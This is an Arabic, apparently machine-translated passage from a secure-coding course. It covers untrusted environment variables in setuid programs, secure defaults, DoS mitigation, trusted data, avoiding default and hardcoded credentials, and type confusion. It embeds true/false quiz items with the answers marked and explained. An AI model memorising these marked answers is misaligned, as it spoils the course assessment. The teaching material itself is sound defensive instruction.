تحتوي بعض أنظمة التشغيل التاريخية على إعدادات غير آمنة لمتغيرات البيئة. واحدة من أكثر الحالات شيوعا هي أن أنظمة التشغيل القديمة تحتوي على متغير بيئة PATH غير آمن ، لذا تم البحث في الدليل الحالي "." عن الملفات التنفيذية قبل أدلة أكثر جدارة بالثقة. وبالمثل ، قام بعض المستخدمين الساذجين بتعيين متغير PATH الخاص بهم على قيم غير آمنة ، على الرغم من أن هذا النوع من الأخطاء أقل شيوعا اليوم. كما أنها خاصة جدا بالبيئة. في العديد من البيئات ، لن يتمكن المهاجم من التحكم في محتويات أي من المواقع.

ومع ذلك ، هناك حالة خاصة مهمة أخرى: إذا كنت تكتب شيئا يسمى **برنامج setuid** أو **setgid** ، فيمكن *أن تأتي متغيرات البيئة من مهاجم.* ربما تكون مقدمة صغيرة في محلها. تسمح الأنظمة الشبيهة ب Unix (بما في ذلك Linux و MacOS) بضبط البرامج و **** / أو **setgid**. عند  تشغيل برنامج **setuid** ، يكون له امتيازات *مالكه* (وليس طالبه).  يعمل برنامج **setgid** بامتيازات *مجموعته* (وليس مجموعات طالبه). ترث هذه الأنواع من البرامج العديد من المدخلات من مهاجم محتمل ، بما في ذلك قيمة الدليل الحالية ومتغيرات البيئة. أحد الحلول هو عدم كتابة  برنامج **setuid** أو **setgid** ، لأنه في كثير من الحالات لا تكون هناك حاجة إلى هذا النهج اليوم.

إذا قمت *بكتابة*  برنامج **setuid**/**setgid** ،  فيجب أن يحمي البرنامج نفسه من جميع مدخلاته ، ويشمل ذلك الدليل الحالي ومتغيرات البيئة. يمكن أن تكون متغيرات البيئة صعبة بشكل خاص ، حيث توجد العديد من الأساليب غير الآمنة التي تبدو آمنة. ذلك لأن متغيرات البيئة عادة ما تكون من مصادر موثوقة ، لذلك فإن معظم المطورين ليسوا مستعدين للتعامل مع الحالة غير العادية حيث لا تكون متغيرات البيئة من مصادر ** موثوقة. الحل الآمن الوحيد هو (كجزء من بدء التشغيل) استخراج ** متغيرات البيئة المطلوبة فقط ، والتأكد من أن قيمها آمنة ، ومحو *جميع* متغيرات البيئة ، وإعادة تعيين المتغيرات اللازمة إلى قيم آمنة (بما في ذلك القيم الآمنة المتوفرة عند بدء تشغيل البرنامج). يعد محو جميع متغيرات البيئة في معظم لغات البرمجة أمرا سهلا ، ما عليك سوى تعيين المتغير العالمي  environ ** على مؤشر فارغ أو ما يعادله (**  يتم تعريف متغير [environ**** في معيار POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html)). افعل ذلك *مبكرا* ، قبل إنشاء أي سلاسل رسائل. لا يمكنك ببساطة إزالة بعض متغيرات البيئة ؛ قد ينشئ المهاجم بنية بيانات متغيرة بيئة غريبة ، وهناك ببساطة عدد كبير جدا من متغيرات البيئة التي يحتمل أن تكون خطرة (مثل **LD_LIBRARY_PATH**) لمحاولة محو قيم خطيرة معينة فقط. هذا مثال آخر على الإدراج المسموح به بدلا من رفض الإدراج. اسمح فقط بمتغيرات البيئة القليلة التي تحتاجها ، مع قيمها المسموح بها ، ولا شيء آخر. بدلا من ذلك ، تأكد من أن المتغيرات الممكنة الوحيدة هي تلك التي تتوقعها ولها قيم آمنة. يتضمن ذلك **PATH** وجميع متغيرات البيئة الأخرى.

 يعد مسار البحث غير الموثوق به سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 22. إنه  CWE-426 [،  مسار ](https://cwe.mitre.org/data/definitions/426.html)بحث غير موثوق به*. يغطي 2021 CWE Top 25 # 34 *عنصر مسار البحث غير المنضبط* ذي الصلة (*CWE-427[).](https://cwe.mitre.org/data/definitions/427.html)


#### اختبار 1.9: مسارات البحث ومتغيرات البيئة (بما في ذلك برامج setuid / setgid)

\>\>إذا كان يجب تشغيل البرنامج حيث لا تكون متغيرات البيئة من مصادر موثوق بها، فيجب عليك استخراج المتغيرات المطلوبة فقط، ومسح جميع متغيرات البيئة، ثم تعيين متغيرات البيئة إلى قيم آمنة (بما في ذلك القيم الآمنة المتوفرة كمدخلات). صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

### المدخلات الخاصة: الإعدادات الافتراضية الآمنة وبدء التشغيل الآمن

هناك مجموعة خاصة من المدخلات التي غالبا ما تستخدم عند بدء التشغيل: معلومات التكوين. هذا يمكن أن يكون حاسما للأمن.

تحتوي الأنظمة الحديثة على العديد من المكونات فيها. من المحتمل أن يكون البرنامج الذي تقوم بتطويره جزءا صغيرا من نظام آخر أكبر بكثير. لا تتوقع من الناس قراءة وثائقك بعناية. لن يفعلوا. بدلا من ذلك ، اجعل من *السهل* استخدام برنامجك بأمان.

أولا ، تأكد من أن برنامجك *آمن افتراضيا*. إذا لم تكن هناك معلومات تكوين ، فيجب أن يقوم برنامجك بكل ما هو الشيء الآمن (والذي عادة ما يكون رفض الوصول). إذا كانت هناك تكوينات نموذجية أو نموذج تعليمات برمجية يوضح كيفية استخدامها ، فتأكد من أن الأمثلة آمنة أيضا (عادة ما يقوم الأشخاص بنسخ الأمثلة ولصقها عند استخدام شيء ما). لا تقم بإنشاء تكوينات نموذجية *تسمح بالوصول إلى الكل* ما لم يكن ذلك استخداما عاديا حقا. بدلا من ذلك ، قم بإنشاء عينات مقيدة بقدر ما يمكنك صنعها بشكل معقول. قم بتضمين العديد من التعليقات الواضحة في نموذج ملف التكوين ، إذا كان هناك واحد ، حتى يفهم المسؤول ما يفعله التكوين.

إذا كانت الأمثلة الآمنة معقدة للغاية أو يصعب شرحها ، فهذا يشير إلى أن التكوين أو واجهة برمجة التطبيقات معقدة للغاية أو تحتوي على إعدادات افتراضية خاطئة. لا تقم فقط بإصلاح الوثائق ، بل قم بإصلاح الكود بحيث يسهل تكوينه أو استخدامه بأمان ، وبعد ذلك سيكون إنشاء الوثائق أسهل.

احصل على معلومات التكوين (خاصة إذا كان يمكن أن تحتوي على رمز) من مصدر جدير بالثقة - وليس من مستخدم غير موثوق به. إذا كنت تقوم بإنشاء تطبيق سطح مكتب تقليدي ، فلا بأس من الحصول على التكوين من الدليل الرئيسي أو دليل التكوين بداخله مثل **$HOME / .config** ، ولكن احذر من التكوينات أو أي بيانات أخرى من الدليل الحالي ؛ قد يكون لدى المستخدم بيانات غير مضغوطة من مهاجم إلى الدليل الحالي. يجب أن تقوم تطبيقات الويب من جانب الخادم بتنزيل التكوينات والتعليمات البرمجية فقط من مصادر موثوقة (على سبيل المثال ، أدلتها المحلية). يجب أن تستخدم تطبيقات الويب من جانب العميل سياسة أمان المحتوى (CSP) للحد من الأماكن التي يمكنهم فيها الحصول على المعلومات ، كما سنناقش لاحقا.

عند بدء التشغيل ، أو حتى بشكل دوري ، ضع في اعتبارك التحقق من صحة افتراضات الأمان الخاصة بك وإيقافها إذا لم تكن كذلك. على سبيل المثال ، إذا كان لديك حق الوصول إلى بعض الملفات الخاصة ، فتأكد من أنها ليست قابلة للقراءة الجماعية أو العالمية. إذا كان تطبيق ويب ، فتحقق من ** استخدام https** (TLS). بعض الفحوصات لا تستحق القيام بها (لأنه من الصعب جدا القيام بها) ، ولكن حتى بعض فحوصات السلامة يمكنها اكتشاف بعض المشكلات ومنعها.

في بعض الأحيان قد يحتاج المستخدمون إلى تعطيل بعض الإجراءات الأمنية. حيثما أمكن ، اجعل ذلك حالة استثنائية ؛ يجب ألا يحتاج المستخدمون عادة إلى القيام بذلك. إذا فعلوا ذلك ، فتأكد من أن المستخدمين **_يعرفون_** أنهم يقومون بتعطيل شيء مهم وما هي العواقب. على الأقل ، وثق أنه خطير ولماذا. في مثل هذه الحالات ، قد يكون من الحكمة الإبلاغ أو على الأقل تسجيل الدخول عند بدء التشغيل عن الإجراء الأمني الذي تم تعطيله ، لاحظ أن هذا أمر خطير ، ولاحظ كيفية إعادة تمكينه.

تحتاج معظم الأنظمة الكبيرة إلى آلية ما لتلقي معلومات التكوين. تأكد من أنه يمكنك الوثوق بالمصدر إذا كان الأمر مهما. على سبيل المثال  ، تتلقى برامج **setuid** متغيرات البيئة  من خصم محتمل ؛ تحتاج مثل هذه البرامج إلى التحقق من صحة متغيرات البيئة التي ستسمح بها ، واستخراجها ، ومحو جميع متغيرات البيئة ، ثم إعادة تعيين القيم فقط إلى تلك التي يمكنهم الوثوق بها.

تحاول بعض الأنظمة الاعتماد  على *التمهيد الآمن* أو آليات مماثلة لضمان تشغيل برنامج معين فقط على جهاز كمبيوتر معين. لا تأخذ هذه الآليات على محمل الجد إذا كان الكمبيوتر (مثل الهاتف الذكي) قد يتم التحكم فيه فعليا بواسطة مهاجم محتمل. إذا كان المهاجم لديه سيطرة فعلية على جهاز ، فإن هذا المهاجم لديه السيطرة المطلقة على الجهاز. الحقيقة هي أن أنظمة التمهيد الآمنة قد تم كسرها بشكل متكرر. الثقة في أن هذا لن يحدث أبدا في المستقبل هو تجاهل لدروس الماضي. من الأفضل لك تصميم نظامك بحيث لا تحتاج إلى الوثوق بالتطبيق على هذا الجهاز ، ولكن بدلا من ذلك قم بتشغيل برنامج تحتاج إلى الوثوق به على الأجهزة التي يتحكم فيها شخص تثق به. تكون أنظمة التمهيد الآمن أقوى بكثير إذا تم التحكم في النظام فعليا من قبل طرف موثوق به ، لأنها توفر ببساطة إجراء وقائيا إضافيا للشخص المتحكم فعليا.

 يعد التكوين الخاطئ للأمان خطأ شائعا في تطبيقات الويب لدرجة أنه 2017 OWASP Top 10 # 6 و 2021 OWASP Top 10 # 5. 2021 CWE Top 25 # 19 CWE-276 [](https://cwe.mitre.org/data/definitions/276.html) يغطي *الأذونات الافتراضية غير الصحيحة*.

#### اختبار 1.10: المدخلات الخاصة: الإعدادات الافتراضية الآمنة وبدء التشغيل الآمن

\>\>لسهولة الاستخدام ، يجب عليك تسليم التطبيقات بكلمة مرور قياسية معروفة وتوضيح كيفية تغيير كلمة المرور هذه في الوثائق. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

كلا على الإطلاق. إذا كانت هناك كلمة مرور قياسية معروفة ، نشرها على الفور على شبكة الويب العالمية ، وسيستخدم جميع المهاجمين كلمة المرور هذه عند محاولة مهاجمة تلك الأنظمة. لن يقرأ العديد من المستخدمين الوثائق. لكي يكون التطبيق آمنا ، يجب أن يكون "آمنا افتراضيا" ؛ يكون التطبيق الذي يحتوي على كلمة مرور معروفة محددة مسبقا *غير آمن* بشكل افتراضي. قد يكون أحد البدائل هو الحصول على مطالبة "الرجاء إنشاء كلمة المرور الخاصة بك" عند استخدام التطبيق لأول مرة.

[تفسير]

## ضع في اعتبارك التوافر على جميع المدخلات

### ضع في اعتبارك التوافر على جميع المدخلات مقدمة

كما ناقشنا من قبل ، غالبا ما يكون من الصعب ضمان التوافر في جميع الظروف الممكنة. على سبيل المثال، إذا كان النظام متاحا للجمهور عبر الإنترنت، فقد يبدأ المهاجم هجوم رفض الخدمة الموزع (DDoS) على نطاق واسع، مما يؤدي إلى إرباك موارد خدمتك.

ولكن بمجرد أن تبدأ في التفكير في التوافر كمشكلة في إدارة المخاطر ، فإن الأمور ليست رهيبة للغاية. تريد تقليل المخاطر الناجمة عن هجمات DoS ، أي تقليل احتمالية حدوثها أو تأثيرها. يمكنك تقليل الاحتمالية عن طريق جعل الهجوم أكثر صعوبة أو خطورة أو كثيف الاستخدام للموارد بالنسبة للمهاجم.

#### حاول التخلص من المدخلات المضخمة بسهولة

مفهوم مفيد هو فكرة الرافعة المالية. * "في سياق هجوم DoS ، إذا كانت الثغرة الأمنية تتمتع برافعة مالية عالية ، فهذا يعني أن المهاجمين يمكنهم استهلاك الكثير من موارد الخادم الخاص بك بأقل قدر من الموارد ... كلما زادت الرافعة المالية ، زادت المخاطر ، وزاد احتمال معالجة المشكلة مباشرة. كلما انخفضت الرافعة المالية ، زاد احتمال قبولي للمخاطر و / أو الاعتماد على [آخر] التخفيف ". * ([*ليست كل الهجمات متساوية: فهم ومنع DoS في تطبيقات الويب ، *](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)بقلم جاكوب كابلان موس ، 2020)

ضع في اعتبارك كل نوع من أنواع المدخلات التي يتلقاها برنامجك. هل هناك أي طريقة يمكن للمهاجم من خلالها إرسال كمية صغيرة جدا من المدخلات واستهلاك كمية كبيرة من الموارد (على سبيل المثال ، الحساب و / أو المخرجات)؟ غالبا ما تكون هذه مخاطر أعلى على التوافر ، لأن هذه المدخلات يتم تضخيمها بسهولة.

فيما يلي بعض الأمثلة على الموارد التي قد يستهلكها الإدخال بشكل غير متناسب:

* عرض النطاق الترددي للشبكة - على سبيل المثال ، يمكن أن ينتج الإدخال مخرجات كبيرة بشكل غير متناسب.

* استخدام وحدة المعالجة المركزية - على سبيل المثال ، يمكن أن يتسبب الإدخال في كميات كبيرة من الحساب ؛ لقد رأينا مثالا على ذلك سابقا في ReDoS.

* مساحة التخزين - على سبيل المثال ، قد يتم توسيع ملف مضغوط لملء التخزين.

* حدود التزامن - على سبيل المثال ، يمكن أن يتسبب الإدخال في تشغيل مؤشر الترابط / العملية ببطء ، مما يتسبب في وصول البرنامج إلى الحد الأقصى للتزامن (على سبيل المثال ، عدد مؤشرات الترابط أو العمليات أو اتصالات قاعدة البيانات).

يمكن تقليل مخاطر ذلك عن طريق المصادقة ، حيث يتعين على المهاجمين كشف بعض المعلومات عن أنفسهم. بشكل عام ، حاول التخلص من الهجمات غير المصادق عليها على الأقل ، وفكر في طلب نوع من المصادقة للباقي ([*ليست كل الهجمات متساوية: فهم ومنع DoS في تطبيقات الويب ، *](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)بقلم جاكوب كابلان موس ، 2020).

أحد الحلول الجزئية لتقليل عرض النطاق الترددي للشبكة هو الترحيل**. أي بدلا من إرجاع نتيجة كبيرة جدا ، قم بإرجاع نتائج أصغر في كل مرة. يتطلب هذا من المهاجم تقديم طلبات بشكل متكرر.

إذا لم تتمكن من التخلص من المدخلات المضخمة للغاية ، فحاول توزيع الحمل. على سبيل المثال ، إذا كنت تقوم بتوزيع ملفات كبيرة ، ففكر في استخدام شبكة توصيل المحتوى (CDN) أو التورنت أو أي نظام آخر من هذا القبيل. تستخدم العديد من مواقع الويب شبكات CDN بحيث لا تطغى الطلبات البسيطة ذات الردود الكبيرة المحتملة على خوادمها.

#### تحديد المعدل

وهناك نهج بسيط يستخدم على نطاق واسع بشأن الأنظمة الشبكية لتحسين التوافر وهو الحد من المعدل. يحد تحديد المعدل من معدل طلبات الإدخال (على سبيل المثال ، لمستخدم معين أو مفتاح API أو عنوان IP). طالما أن حدود المعدل مرتفعة نسبيا ، فإن حدود المعدل لا تؤثر بشكل كبير على الاستخدام العادي ، ويمكن أن تجعل هجمات DoS ذات النظام الواحد أقل فعالية. في بعض الحالات ، يمكن أن توفر حدود المعدل تدبيرا مضادا جزئيا ضد هجمات DDoS (لأنها قد تقلل من فعالية كل نظام مهاجم). الحد من معدل أيضا يقاوم بعض المشاكل العرضية.

لاحظ أنه إذا أجبرت المهاجمين على تقديم العديد من الطلبات (على سبيل المثال ، عبر الترحيل) ، فقد يبدأ المهاجم في الوصول إلى حدود المعدل.

تحديد المعدل ليس حلا كاملا ، ولكنه نهج سهل وغير مكلف يزيد من التكاليف والجهود التي يبذلها المهاجمون.

# معالجة البيانات بشكل آمن

يصف هذا الفصل كيفية معالجة البيانات داخل البرنامج مع وضع الأمان في الاعتبار، بما في ذلك التعامل مع البيانات غير الموثوق بها على أنها خطيرة، وتجنب بيانات الاعتماد الافتراضية والمشفرة، وتجنب مشكلات أمان الذاكرة (مثل تجاوز سعة المخزن المؤقت)، وتجنب السلوك غير المحدد.

أهداف التعلم:

1. ناقش كيفية معالجة البيانات بأمان (على سبيل المثال ، التعامل مع البيانات غير الموثوق بها على أنها خطيرة).

2. فهم أهمية تجنب بيانات الاعتماد الافتراضية والمشفرة.

3. ناقش سلامة الذاكرة والمشاكل عندما لا تكون موجودة: عمليات قراءة / كتابة خارج الحدود ، خالية من المرتين ، خالية من الاستخدام بعد ذلك.

4. فهم تجنب السلوك غير المحدد.

## معالجة البيانات بشكل آمن: قضايا عامة

### تفضل البيانات الموثوقة. تعامل مع البيانات غير الموثوق بها على أنها خطيرة

بالطبع ، بمجرد حصول برنامجك على البيانات ، فإنه يحتاج إلى معالجة تلك البيانات.

إذا كان الأمر مهما ، فتأكد من معالجة بياناتك باستخدام بيئة يمكنك الوثوق بها. تماما مثل التحقق من صحة الإدخال ، إذا كنت تهتم بالإجابة بعد معالجة البيانات ، فأنت بحاجة إلى معالجة بياناتك على نظام يمكنك الوثوق به. إذا قمت بمعالجة البيانات باستخدام برنامج نصي على متصفح ويب أو تطبيق جوال وقد يتم التحكم في متصفح الويب أو تطبيق الهاتف المحمول هذا بواسطة مهاجم ، فلا يمكنك الوثوق بأي شيء يفعله ؛ ستكون كل هذه البيانات مرئية للمهاجم وقد يفرض المهاجم نتائج مختلفة. إذا كان بإمكان المهاجمين مهاجمة أنفسهم فقط ، فهذه ليست مشكلة ، ولكن تأكد من أنها تقتصر على ذلك. إذا قام نظام غير موثوق به بمعالجة بعض البيانات ، وأرسل النتيجة إليك ، فأنت بحاجة إلى التعامل معها على أنها بيانات غير موثوق بها.

وهو ما يقودنا إلى قاعدة أساسية مفيدة: *كلما أعطيت خيارا ، حاول استخدام البيانات الأكثر موثوقية.*

مثال قد يساعد. ترسل العديد من الأنظمة ، عند إرسال طلب إعادة تعيين كلمة المرور ، بريدا إلكترونيا لتأكيد إعادة تعيين كلمة المرور. في وقت من الأوقات ، كان GitHub يطلب من مستخدم غير موثوق به عنوان بريده الإلكتروني. إذا كان ذلك يتطابق مع عنوان بريد إلكتروني في قاعدة البيانات الخاصة بهم ، متجاهلا الفروق بين الأحرف الكبيرة / الصغيرة باستخدام قواعد اللغة الإنجليزية ، فسيرسل GitHub إعادة تعيين كلمة المرور إلى عنوان البريد الإلكتروني *كما قدمه المهاجم.* كانت هذه فكرة رهيبة. لا تضمن معايير البريد الإلكتروني أن الجزء المحلي من عنوان البريد الإلكتروني (الجزء الذي يسبق  الرمز **@**) غير حساس لحالة الأحرف (انظر [IETF RFC 5321 القسم 2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11)). من خلال تحويل عنوان البريد الإلكتروني إلى أحرف صغيرة ، ليس هناك ما يضمن إرسال إعادة التعيين إلى عنوان البريد الإلكتروني الصحيح. تتجاهل العديد من أنظمة البريد الإلكتروني الفروق بين الأحرف الكبيرة / الصغيرة ، لكنها قد لا تستخدم اللغة الإنجليزية! في بعض أنظمة البريد الإلكتروني التركية ، سيتم تطبيع الجزء المحلي من عنوان البريد الإلكتروني إلى ** حساب بريد إلكتروني مختلف عن الحساب الأصلي. على سبيل المثال  ، **MIKE@example.org** سيعود إلى mı **ke@example.org** (باستخدام i بدون نقاط) ، والذي سيكون حساب بريد إلكتروني مختلفا عن **mike@example.org** (الذي يستخدم i منقط). أدى ذلك إلى ثغرة أمنية قابلة للاستغلال (GitHub Security  ، [*رسائل البريد الإلكتروني لإعادة تعيين كلمة المرور التي تم تسليمها إلى عنوان خاطئ*](https://bounty.github.com/researchers/jagracey.html) ، 2016).

يبدو هذا الهجوم خفيا ، لكن هذا انتهاك واضح لقاعدتنا الأساسية: إذا كان لديك المزيد من البيانات الموثوقة المتاحة ، فحاول استخدام *تلك* البيانات الأكثر موثوقية! على سبيل المثال، إذا كان لديك طلب إعادة تعيين كلمة مرور، وتريد إرسال بريد إلكتروني لتأكيد أن المستخدم الذي تم تأكيده في الأصل قد أذن بذلك، فيجب عليك إرسال البريد الإلكتروني لإعادة التعيين إلى عنوان البريد الإلكتروني المؤكد *بالفعل* في قاعدة البيانات الخاصة بك. لقد أكدت بالفعل أن هذا هو عنوان البريد الإلكتروني الصحيح ، لذا يمكنك وضع المزيد من الثقة فيه. هذه القاعدة البسيطة  - *حاول استخدام البيانات الأكثر موثوقية* - ستتجنب العديد من الهجمات الدقيقة دون أن تدرك ذلك.

ومع ذلك ، يتعين على العديد من التطبيقات معالجة البيانات غير الموثوق بها. في هذه الحالة ، عندما يتعين عليك معالجة بيانات غير موثوق بها ، تعامل معها على **_ أنها مشعة_** - أي كن حذرا عند معالجتها بأي شكل من الأشكال ، وتذكر أنها قد تكون من مهاجم. هناك العديد من الطرق التي تحتاج إلى توخي الحذر ، كما سنناقش.

#### اختبار 2.1: تفضل البيانات الموثوقة. تعامل مع البيانات غير الموثوق بها على أنها خطيرة

\>\>إذا تلقينا طلب إعادة تعيين كلمة المرور لحساب بريد إلكتروني ، وكان لديه تطابق غير حساس لحالة الأحرف مع حساب بريد إلكتروني تم التحقق منه في قاعدة البيانات الخاصة بنا ، فيجب أن نرسل التأكيد إلى حساب البريد الإلكتروني الذي أرسله المستخدم للتو. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

كلا على الإطلاق. أرسل مهاجم محتمل عنوان بريد إلكتروني ، وبالتالي فإن الشيء الوحيد الذي يمكنك التأكد منه هو أن شخصا ما أرسل عنوان البريد الإلكتروني هذا. إذا كانت إعادة التعيين لحساب معين ، فيجب استخدام بريد إلكتروني فقط إلى عنوان *معروف* بتطبيقه على هذا الحساب (من قاعدة البيانات) ، لأننا نفضل بشكل عام استخدام (أكثر) بيانات موثوقة.

إعادة تعيين كلمة المرور باستخدام البريد الإلكتروني فقط ليست آلية مصادقة قوية للبدء بها. لكنه ظرف شائع بما فيه الكفاية ، وهو مفيد كمثال بسيط.

[تفسير]

### تجنب بيانات الاعتماد الافتراضية والمشفرة

يجب على العديد من البرامج استخدام بعض المعلومات السرية. نوع شائع بشكل خاص من السر هو *بيانات الاعتماد* (على سبيل المثال ، كلمة مرور أو مفتاح سري).  تعتمد كيفية حمايتها على كيفية استخدامها، وهناك استخدامان شائعان لبيانات الاعتماد:

* **الوارد**<br>يتلقى البرنامج بعض بيانات الاعتماد كمدخلات ويتحقق مما إذا كان يتطابق مع مصادقة شيء آخر.

* **صادر**<br>يرسل البرنامج بيانات الاعتماد إلى شيء آخر لمصادقة نفسه على شيء آخر.

#### تجنب بيانات الاعتماد الافتراضية

لا ينبغي أبدا تسليم البرنامج ببيانات اعتماد افتراضية. هناك صفحات ويب لا نهاية لها تتعقب بيانات الاعتماد الافتراضية مثل  admin **/ admin**. بمجرد أن يعثر أي شخص على بيانات الاعتماد ، فمن المحتمل أن ينتهي به الأمر في النهاية في هذه القوائم. سيمكن هذا المهاجمين من اقتحام برنامجك (إذا كانت بيانات اعتماد واردة) أو برامج الآخرين (إذا كانت بيانات اعتماد صادرة). إذا كان البرنامج يحتوي على العديد من عمليات التثبيت ، فقد تكون جميعها عرضة للخطر في نفس الوقت. **تذكر:** يقبل المستخدمون عموما كل ما هو الإعداد الافتراضي ، وإذا كان الإعداد الافتراضي غير آمن ، فسيكون البرنامج غير آمن. التعتيم على الكود لا يكفي. العديد من المهاجمين بارعون جدا في استخراج وتحليل الملفات التنفيذية.

الحل المعتاد لذلك هو أن يكون لديك وضع "تسجيل الدخول الأول" الذي يكتشف أنه لا توجد بيانات اعتماد (كلمة مرور أو مفتاح) حتى الآن ، ثم يتيح للمستخدم إنشاء وضع فريد. هذا على افتراض أنه يحتاج إلى تخزينه على الإطلاق. في بعض الحالات ، يمكنك ببساطة أن تطلب من المستخدم تقديمه في كل مرة.

#### تجنب بيانات الاعتماد المشفرة ، وقم بتخزينها بأمان بدلا من ذلك

بيانات الاعتماد المشفرة هي بيانات اعتماد مخزنة داخل التعليمات البرمجية المصدر أو التعليمات البرمجية المترجمة أو أي موقع آخر لا يمكن تغييره بسرعة بواسطة شخص مخول للقيام بذلك.

بيانات الاعتماد المشفرة هي أخطاء. يجب تغيير بيانات الاعتماد كلما تم تثبيت البرنامج لأول مرة للاستخدام ويجب أن يكون التغيير سهلا وسريعا. يعد تخزين بيانات الاعتماد في التعليمات البرمجية المصدر فكرة سيئة بشكل خاص. عادة ما تتم إدارة التعليمات البرمجية المصدر بواسطة أنظمة التحكم في الإصدار ، لذلك ستصبح أي بيانات اعتماد في الكود متاحة لأي شخص لديه حق الوصول إلى شفرة المصدر هذه ... وهذا غالبا ما يكون أكثر بكثير من الناس مما يحتاجون إلى معرفته. لا يساعد ترميز هذه المعلومات بطريقة يمكن التراجع عنها (على سبيل المثال ، استخدام Base64 أو ROT13).

لذلك: لا تقم بترميز بيانات الاعتماد الثابتة (على سبيل المثال ، داخل شفرة المصدر أو التعليمات البرمجية المترجمة). بدلا من ذلك ، قم بتخزين بيانات الاعتماد بشكل منفصل بطريقة تجعل من السهل تغييرها. لا تحتاج شهادات المفتاح العام عادة إلى الحفاظ على سريتها، ولكن قد تحتاج إلى تحديث. غالبا ما تحتاج أوراق الاعتماد الأخرى إلى الحفاظ على سريتها ، ويجب حمايتها على الأقل بقدر الضرورة. كما سنناقش بإيجاز لاحقا ، هناك أدوات قد تساعدك في تحديد بيانات الاعتماد المشفرة في شفرة المصدر.

للمصادقة الواردة باستخدام كلمات المرور ، قم بتخزين بيانات الاعتماد بشكل منفصل واستخدم خوارزمية آمنة مصممة خصيصا لتشفيرها. سنناقش هذا بمزيد من التفصيل لاحقا في القسم الخاص بالتشفير ، ولكن في الوقت الحالي ، اعلم فقط أنك بحاجة إلى استخدام  خوارزمية *تجزئة تشفير مملحة متكررة لكل مستخدم* مثل Argon2id.

للمصادقة الصادرة، يجب تخزين بيانات الاعتماد خارج التعليمات البرمجية في نظام تخزين محمي من جميع الغرباء (بما في ذلك المستخدمين المحليين على نفس النظام/مضيف السحابة). من الناحية المثالية ، سيتم تخزين جميع بيانات الاعتماد في ملف أو قاعدة بيانات مشفرة ، ولكن في العديد من البيئات ، يصعب القيام بذلك (أين تخزن المفتاح للوصول إلى المفتاح؟). على الأقل ، قم بتخزين بيانات الاعتماد في شيء مثل ملف أو جدول قاعدة بيانات بأذونات مقيدة بقدر ما يمكنك إجراؤها عمليا. تعد متغيرات البيئة بشكل عام طريقة أضعف لتخزين بيانات الاعتماد ، نظرا لأن قيمها متاحة للعملية بأكملها التي تقوم بتحميلها ، ولكن في بعض الحالات يكون هذا مقبولا ... وهو بشكل عام أفضل بكثير من بيانات اعتماد الترميز الثابت.

 تعد بيانات الاعتماد المشفرة سببا شائعا للثغرات الأمنية لدرجة أنها 2021 CWE Top 25 # 16 و 2019 CWE Top 25 # 19. هذا الضعف هو [CWE-798 ](https://cwe.mitre.org/data/definitions/798.html)، *استخدام بيانات الاعتماد المشفرة*.  بيانات *الاعتماد غير المحمية بشكل كاف* ذات الصلة هي 2021 CWE Top 25 #  21 و 2019 CWE Top 25 # 27 ك CWE-522[](https://cwe.mitre.org/data/definitions/522.html).

#### اختبار 2.2: تجنب بيانات الاعتماد الافتراضية والمشفرة

يجب تخزين مفاتيح \>\>Secret في التعليمات البرمجية المصدر بحيث لا يمكن قراءتها بسهولة ، كما يمكن أن تكون إذا تم تخزينها في ملفات منفصلة. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

لا ، بل على العكس تماما. لا تقم بتخزين المفاتيح السرية في شفرة المصدر! غالبا ما تتم مشاركة شفرة المصدر مع العديد من الآخرين ، ويتم تخزينها في أنظمة التحكم في الإصدار (مما يجعلها في متناول الآخرين). سبب آخر لتخزين المفاتيح السرية بشكل منفصل هو أنه يمكن تغييرها بسهولة. إذا قرأ أحد المهاجمين المفاتيح السرية ، فما عليك سوى تغيير المفاتيح.

[تفسير]

### تجنب التحويل غير الصحيح أو الإرسال

تدعم جميع لغات البرمجة تقريبا أنواعا متعددة من البيانات ، مثل الأعداد الصحيحة والفاصلة العائمة والأحرف والسلاسل. تحتوي معظم لغات البرمجة على الأقل على بعض أنواع التحقق المضمنة فيها ؛ يمكن التحقق من الأنواع بشكل ثابت (قبل وقت التشغيل) و / أو ديناميكيا (في وقت التشغيل). يمكن لهذه الفحوصات في بعض الأحيان أن تحذر أو تتصدى للمشاكل الخطيرة.

في بعض الأحيان يكون من الضروري تحويل أو إرسال قيمة بيانات من نوع إلى آخر. تعتمد التفاصيل على لغة البرمجة ، ولكن في حين أنها ضرورية ، فإن التحويلات والقوالب غير الصحيحة تنتهي بالتسبب في عدد غير متناسب من نقاط الضعف. يمكن أن يفقد التحويل المعلومات ، أو يؤدي إلى قيمة جديدة ربما كانت غير متوقعة تماما. يجب مراجعة أي تحويل أو إرسال ، خاصة إذا كان قد يفقد المعلومات ، للنظر فيما إذا كان هناك خطر من القيام بذلك. تحتوي بعض اللغات  على مؤهل const ** لإعلان الثوابت ؛ من الخطر التخلص من مؤهل **const** ، لأن هذا يسمح بإجراء تغييرات على القيمة بينما قد تعتمد أجزاء أخرى من النظام على كونها ثابتة.**

حالة خاصة ، والتي يمكن أن تحدث في بعض لغات البرمجة ، تسمى "نوع الارتباك". يحدث التباس النوع عند حدوث الوصول إلى مورد باستخدام نوع غير متوافق مع نوعه الأصلي. يمكن اعتبار هذا تحويلا صامتا غير صحيح. يتم ذلك بسهولة في لغات مثل C و C ++ باستخدام أنواع الاتحاد ، حيث يمكن تعريف نفس منطقة الذاكرة صراحة على أنها تسمح بأنواع متعددة. عند استخدام أنواع الاتحاد، يجب على المطور التأكد من استخدام النوع الصحيح فقط للوصول المحدد (قراءة أو كتابة).

ومع ذلك ، لا يقتصر ارتباك النوع على C و C ++. يمكن أن يحدث ارتباك النوع في أي لغة حيث يمكن تفسير نفس المتغير أو موقع الذاكرة بأكثر من طريقة. كما لاحظ MITRE ل [CWE-843](https://cwe.mitre.org/data/definitions/843.html) ، "يمكن تشغيل الأخطاء في تطبيقات PHP من خلال توفير معلمات الصفيف عند توقع الأعداد القياسية ، أو العكس. يمكن أن تحتوي لغات مثل Perl ، التي تقوم بإجراء تحويل تلقائي لمتغير من نوع واحد عند الوصول إليه كما لو كان نوعا آخر ، على هذه المشكلات ".

